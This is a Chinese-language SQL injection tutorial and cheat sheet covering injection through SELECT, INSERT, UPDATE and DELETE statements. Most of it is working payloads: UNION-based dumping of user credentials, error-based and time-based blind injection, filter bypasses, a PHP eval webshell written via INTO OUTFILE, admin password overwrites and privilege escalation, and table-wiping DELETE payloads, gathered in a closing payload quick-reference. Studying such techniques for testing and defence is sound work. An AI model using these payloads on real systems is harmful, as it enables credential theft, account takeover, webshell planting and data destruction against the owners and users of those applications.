# 2026-07-29 四大提交方式注入 — SELECT / INSERT / UPDATE / DELETE

## 一、概述

注入不仅发生在 `SELECT` 查询中，只要是应用与数据库交互的地方都可能存在注入：

| 语句类型 | 常见场景 | 注入难度 | 危害 |
|---------|---------|---------|------|
| SELECT | 搜索、列表、详情页 | ★☆☆ | 数据泄露 |
| INSERT | 注册、留言、上传 | ★★☆ | 写入恶意数据/拿shell |
| UPDATE | 修改资料、密码重置 | ★★☆ | 篡改数据/提权 |
| DELETE | 删除文章、清空记录 | ★★★ | 数据破坏 |

---

## 二、SELECT 注入

### 2.1 场景

最经典的注入场景，出现在查询类接口。

```
URL:    /product.php?id=1
SQL:    SELECT * FROM products WHERE id = $_GET['id']

搜索:   /search.php?keyword=手机
SQL:    SELECT * FROM products WHERE name LIKE '%$_GET['keyword']%'

登录:   POST username=admin&password=123456
SQL:    SELECT * FROM users WHERE username='$_POST['username']' AND password='$_POST['password']'
```

### 2.2 注入手法

```sql
-- 数字型：直接拼接
?id=1 AND 1=1
?id=1 AND 1=2
?id=1 ORDER BY 1 --
?id=-1 UNION SELECT 1,2,3 --

-- 字符型：闭合引号
?id=1' AND '1'='1
?id=1' AND '1'='2
?id=1' ORDER BY 1 --
?id=-1' UNION SELECT 1,2,3 --

-- LIKE 型：闭合单引号和百分号
?keyword=test' AND '1'='1' --+
?keyword=test' OR 1=1 --+

-- 搜索框注入（LIKE 型）
?keyword=test%' UNION SELECT 1,2,3 --
```

### 2.3 联合查询完整流程

```sql
-- Step 1: 判断列数
ORDER BY 1
ORDER BY 2
...（直到报错，确定列数）

-- Step 2: 判断回显位
UNION SELECT 1,2,3,4,5 --

-- Step 3: 爆数据库名
UNION SELECT 1,database(),3,4,5 --

-- Step 4: 爆表名
UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database() --

-- Step 5: 爆字段名
UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users' --

-- Step 6: 爆数据
UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users --
```

### 2.4 SELECT 绕过技巧

```sql
-- 绕过引号过滤（十六进制）
SELECT * FROM users WHERE username=0x61646d696e  -- 'admin'

-- 绕过空格过滤（/**/ 替代）
SELECT/**/*/**/FROM/**/users

-- 绕过等号（LIKE 替代）
AND 1 LIKE 1
AND substr(database(),1,1) LIKE 'a'

-- 绕过逗号（JOIN 替代 substr 的逗号）
SELECT * FROM users WHERE id=1 AND ascii(substr(database() FROM 1 FOR 1))=115

-- 宽字节注入（GBK编码下 %df 吃掉反斜杠）
?id=1%df' UNION SELECT 1,2,3 --
```

---

## 三、INSERT 注入

### 3.1 场景

注册、留言板、新增文章、订单提交等。

```sql
-- 注册场景
INSERT INTO users (username, password, email) VALUES ('$username', '$password', '$email')

-- 留言场景
INSERT INTO messages (user_id, content) VALUES ($uid, '$content')

-- 订单场景
INSERT INTO orders (user_id, product_name, price) VALUES ($uid, '$name', $price)
```

### 3.2 注入手法

#### (1) 闭合单引号扩展列

```sql
-- 正常注册
username=test&password=123&email=test@test.com
-- SQL: INSERT INTO users VALUES ('test', '123', 'test@test.com')

-- 注入：在字段中闭合，插入额外数据
username=test', 'injected_pass', 'hack@hack.com') -- 
-- SQL: INSERT INTO users VALUES ('test', 'injected_pass', 'hack@hack.com') -- ', '123', 'test@test.com')
-- 结果：插入了攻击者控制的数据，后面被注释掉

-- 扩展列（插入管理员）
username=admin', 'admin_pass', 'admin@admin.com'), ('test2', '123', 'x@x.com') -- 
-- SQL: INSERT INTO users VALUES ('admin', 'admin_pass', 'admin@admin.com'), ('test2', '123', 'x@x.com') -- ...
-- 一次注册插入两条记录，第一条是管理员
```

#### (2) 通过 INSERT 报错注入

```sql
-- updatexml 报错
username=test' OR updatexml(1, concat(0x7e, database()), 1) OR '
-- SQL: INSERT INTO users VALUES ('test' OR updatexml(1, concat(0x7e, database()), 1) OR '', '123', 'x@x.com')

-- extractvalue 报错
username=test' OR extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1))) OR '

-- floor + rand 报错
username=test' OR (SELECT 1 FROM (SELECT count(*), concat((SELECT database()), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) OR '
```

**INSERT 报错模板：**
```sql
' OR <报错payload> OR '
```

#### (3) 时间盲注

```sql
username=test' OR if(ascii(substr(database(),1,1))=115, sleep(3), 0) OR '
```

#### (4) 写文件（MySQL）

```sql
-- 如果 INSERT 表有 FILE 权限
username=<?php @eval($_POST[1]);?>', 'x', 'x') INTO OUTFILE '/var/www/html/shell.php' -- 
```

#### (5) 修改自身（UPDATE-like INSERT）

```sql
-- ON DUPLICATE KEY UPDATE
username=admin&password=123 ON DUPLICATE KEY UPDATE password='hacked'
-- SQL: INSERT INTO users VALUES ('admin', '123' ON DUPLICATE KEY UPDATE password='hacked')
```

### 3.3 INSERT 注入注意事项

```
1. 引号闭合：字段是 'value' 时先闭合再构造
2. 括号闭合：VALUES (a,b,c) 需要保持列数一致
3. 后置处理：用 ) -- 或 ,'x') -- 吃掉原SQL剩余部分
4. 前端限制：注册字段可能有限长，需要绕过
```

---

## 四、UPDATE 注入

### 4.1 场景

修改资料、改密码、修改文章、修改订单状态等。

```sql
-- 修改个人资料
UPDATE users SET nickname='$nickname', email='$email' WHERE id=$uid

-- 修改密码
UPDATE users SET password='$newpass' WHERE username='$user'

-- 批量操作
UPDATE articles SET status=$status WHERE id IN ($ids)
```

### 4.2 注入手法

#### (1) 修改更多字段（越权）

```sql
-- 正常修改昵称
nickname=我的昵称
-- SQL: UPDATE users SET nickname='我的昵称' WHERE id=1

-- 注入：闭合昵称，附加修改密码
nickname=test', password='hacked' WHERE id=1 -- 
-- SQL: UPDATE users SET nickname='test', password='hacked' WHERE id=1 -- ' WHERE id=1
-- 结果：连密码一起改了

-- 修改管理员密码
nickname=test', password='hacked', is_admin=1 WHERE username='admin' -- 
```

#### (2) 报错注入

```sql
-- updatexml
nickname=test' OR updatexml(1, concat(0x7e, database()), 1) OR '

-- floor + rand
nickname=test' OR (SELECT 1 FROM (SELECT count(*), concat(database(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) OR '
```

**UPDATE 报错模板：**
```sql
' OR <报错payload> OR '
```

#### (3) 条件延时注入

```sql
-- 密码重置处延时
newpass=123' OR if(ascii(substr(database(),1,1))=115, sleep(3), 0) OR '

-- 修改资料处延时
nickname=test' OR if(ascii(substr((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))=97, sleep(3), 0) OR '
```

#### (4) 嵌套子查询实现更复杂操作

```sql
-- 将其他用户的密码偷出来
UPDATE users SET nickname=(SELECT password FROM users WHERE username='admin') WHERE username='attacker'
```

#### (5) 利用 UPDATE 读取系统变量

```sql
nickname=test', signature=(SELECT @@version) WHERE id=1 -- 
-- 把数据库版本写到自己的签名栏
```

### 4.3 UPDATE 注入特殊技巧

```sql
-- 利用 IF 条件更新不同值
UPDATE users SET email=IF(ascii(substr(database(),1,1))=115, 'true@x.com', 'false@x.com') WHERE id=1
-- 然后查看自己的email是 true@ 还是 false@，实现布尔盲注回显

-- 利用 CASE WHEN
UPDATE users SET email=CASE WHEN (ascii(substr(database(),1,1))=115) THEN 'true@x.com' ELSE 'false@x.com' END WHERE id=1
```

---

## 五、DELETE 注入

### 5.1 场景

删除文章、取消订单、清空购物车等。

```sql
-- 删除文章
DELETE FROM articles WHERE id = $id

-- 删除留言
DELETE FROM messages WHERE id = $id AND user_id = $uid

-- 批量删除
DELETE FROM cart WHERE item_id IN ($ids)
```

### 5.2 注入手法

DELETE 注入最难利用，因为没有回显位、没有数据更新点，基本只能靠**报错注入**或**延时注入**。

#### (1) 报错注入

```sql
-- 数字型 DELETE
DELETE FROM articles WHERE id = 1 OR updatexml(1, concat(0x7e, database()), 1)

-- 实际注入 payload
?id=1 OR updatexml(1, concat(0x7e, database()), 1)
-- SQL: DELETE FROM articles WHERE id = 1 OR updatexml(1, concat(0x7e, database()), 1)
-- 触发 XPATH 报错，回显 database()

-- 逐行爆表名
?id=1 OR updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1)), 1)
```

#### (2) 延时注入

```sql
-- MySQL
?id=1 OR if(ascii(substr(database(),1,1))=115, sleep(3), 0)

-- MSSQL
; IF(ascii(substring(db_name(), 1, 1))=115) WAITFOR DELAY '0:0:3' --
```

#### (3) 扩大删除范围（破坏性）

```sql
-- 删除所有条目
?id=1 OR 1=1
-- SQL: DELETE FROM articles WHERE id = 1 OR 1=1
-- 结果：整张表被清空！

-- 指定条件删除
?id=1 OR author='admin'
-- SQL: DELETE FROM articles WHERE id = 1 OR author='admin'
```

#### (4) 通过 JOIN 删除关联数据

```sql
-- DELETE 结合子查询
DELETE FROM articles WHERE id = 1 AND (SELECT 1 FROM users WHERE username='admin')
```

### 5.3 DELETE 注入的局限性

```
1. 无法 UNION SELECT — 无回显位
2. 无法写文件 — DELETE 语法不支持 INTO OUTFILE
3. 只能报错或延时 — 手段有限
4. 破坏性大 — 一旦 DELETE 执行，数据就没了
```

---

## 六、四大注入方式对比总结

| 对比维度 | SELECT | INSERT | UPDATE | DELETE |
|---------|--------|--------|--------|--------|
| UNION查询 | ✅ 可用 | ❌ 不可用 | ❌ 不可用 | ❌ 不可用 |
| 报错注入 | ✅ | ✅ | ✅ | ✅ |
| 布尔盲注 | ✅ | ❌ 难 | ✅ (间接) | ❌ 难 |
| 延时注入 | ✅ | ✅ | ✅ | ✅ |
| 写文件 | ✅ OUTFILE | ✅ OUTFILE | ❌ 不可用 | ❌ 不可用 |
| 回显数据 | ✅ 直接 | ❌ 难 | ✅ (间接) | ❌ 难 |
| 利用难度 | ★ | ★★ | ★★ | ★★★ |

---

## 七、各场景实战 Payload 速查

### 7.1 INSERT

```sql
-- 报错
' OR updatexml(1, concat(0x7e, database()), 1) OR '

-- 延时
' OR if(ascii(substr(database(),1,1))=115, sleep(3), 0) OR '

-- 越权注册
admin', 'hacked', 'admin@x.com'), ('guest', '123', 'g@x.com') -- 

-- ON DUPLICATE KEY 改密码
admin') ON DUPLICATE KEY UPDATE password='hacked' --
```

### 7.2 UPDATE

```sql
-- 报错
' OR updatexml(1, concat(0x7e, database()), 1) OR '

-- 改密码
test', password='hacked' WHERE id=1 -- 

-- IF 布尔回显
test', email=IF(ascii(substr(database(),1,1))=115, 'true@x.com', 'false@x.com') WHERE id=1 -- 

-- 读系统变量回显
test', signature=(SELECT @@version) WHERE id=1 -- 
```

### 7.3 DELETE

```sql
-- 报错（参数直接在URL中）
1 OR updatexml(1, concat(0x7e, database()), 1)

-- 延时
1 OR if(ascii(substr(database(),1,1))=115, sleep(3), 0)

-- 配合堆叠（MSSQL）
1; WAITFOR DELAY '0:0:3' --
```

### 7.4 SELECT

```sql
-- 联合查询
-1' UNION SELECT 1,2,3 --

-- 报错
' AND updatexml(1, concat(0x7e, database()), 1) -- 

-- 布尔盲注
' AND ascii(substr(database(),1,1))=115 -- 

-- 延时
' AND if(ascii(substr(database(),1,1))=115, sleep(3), 0) -- 
```

---

## 八、不同请求方式的注入位置总结

```
请求方式     注入位置            语句类型
─────────────────────────────────────────
GET          URL 参数            SELECT
POST         表单字段             INSERT / UPDATE / SELECT
Cookie       Cookie 值           SELECT (常被忽略!)
HTTP Header  User-Agent /        INSERT (日志表)
             Referer / X-Forwarded-For
JSON Body    请求体字段           INSERT / UPDATE
RESTful      PUT / DELETE路径    UPDATE / DELETE
```

---

> **要点：**
> - **SELECT**：手段最多（UNION/报错/布尔/延时都用上），最容易被找到
> - **INSERT**：闭合引号 + 报错注入为主，可以写 shell，可以批量注册提权账号
> - **UPDATE**：闭合引号 + 报错注入，可以子查询读取系统信息写到自己的字段里，可以改密码越权
> - **DELETE**：最难利用，几乎只能靠报错注入和延时注入，且破坏性大
